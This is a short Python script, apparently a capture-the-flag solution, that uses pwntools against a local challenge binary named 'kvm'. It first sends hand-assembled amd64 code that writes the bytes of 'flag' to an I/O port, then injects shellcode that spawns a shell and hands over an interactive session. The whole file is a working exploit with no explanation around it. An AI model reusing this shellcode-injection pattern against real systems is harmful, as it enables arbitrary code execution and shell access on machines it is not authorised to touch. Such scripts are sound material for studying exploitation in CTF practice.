#/usr/bin/env python
from pwn import *

p = process('./kvm')

p.recvuntil("execute: \n")

code = asm('''
	movabs rax, 0x67616c66
  	push 4
  	pop rcx
  	mov edx, 0x100
  OUT:
  	out dx, al
  	shr rax, 8
  	loop OUT
	''', arch = 'amd64')

p.sendline(code)

p.recvuntil("execute again: \n")
#gdb.attach(p)
p.sendline(asm(shellcraft.amd64.linux.sh(), arch = 'amd64'))

p.interactive()